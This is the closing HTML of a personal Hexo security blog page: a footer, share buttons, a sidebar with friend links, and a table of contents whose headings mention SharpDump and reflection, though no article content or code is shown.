+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/CobaltStrikeCode/" rel="next" title="CobaltStrike二次开发">
+                <i class="fa fa-chevron-left"></i> CobaltStrike二次开发
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Daftar Isi
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Ikhtisar
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">123</span>
+                    <span class="site-state-item-name">posting</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">19</span>
+                    <span class="site-state-item-name">kategori</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">122</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sqlmap.wiki/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Part1"><span class="nav-number">1.</span> <span class="nav-text">Part1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#win32的调用"><span class="nav-number">1.1.</span> <span class="nav-text">win32的调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SharpDump"><span class="nav-number">1.2.</span> <span class="nav-text">SharpDump</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part2"><span class="nav-number">2.</span> <span class="nav-text">Part2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part3"><span class="nav-number">3.</span> <span class="nav-text">Part3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反射使用"><span class="nav-number">3.1.</span> <span class="nav-text">反射使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实操"><span class="nav-number">3.2.</span> <span class="nav-text">实操</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part4"><span class="nav-number">4.</span> <span class="nav-text">Part4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part5"><span class="nav-number">5.</span> <span class="nav-text">Part5</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Tema – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
